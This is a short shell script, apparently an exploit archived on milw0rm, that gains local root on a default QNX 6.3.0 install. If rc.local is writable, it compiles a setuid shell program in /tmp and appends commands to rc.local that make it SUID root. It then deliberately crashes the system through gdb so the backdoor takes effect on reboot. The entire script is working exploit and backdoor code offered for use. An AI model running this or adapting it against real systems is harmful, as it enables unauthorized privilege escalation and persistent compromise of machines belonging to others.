#!/bin/sh
# this combines http://www.idefense.com/intelligence/vulnerabilities/display.php?id=387
# and http://www.idefense.com/intelligence/vulnerabilities/display.php?id=386
# into local r00t w00t t00t t00t, hugs and kisses from www.lort.dk. 
# unset PAGER; man chmod | mail -s "urgent reading" support@qnx.com
# kokanin discovered this around august/september 2004
echo "performing check"
if [ -w /etc/rc.d/rc.local ] ; 
then echo "check passed, backdooring system" && 
cat >/tmp/moo.c << __EOF__ && cd /tmp && make moo && echo "chown root /tmp/moo\
&& chmod 6755 /tmp/moo" >> /etc/rc.d/rc.local && echo "rc.local backdoored,\
 crashing system" && echo -e "break *0xb032d59f\nr\ncont\ncont" | gdb gdb; 
int main(){
setuid(0);
system("/bin/sh");
}
__EOF__
else echo "system is not a default QNX 6.3.0 install, or someone set correct permissions manually, sorry";
fi

# milw0rm.com [2006-02-08]
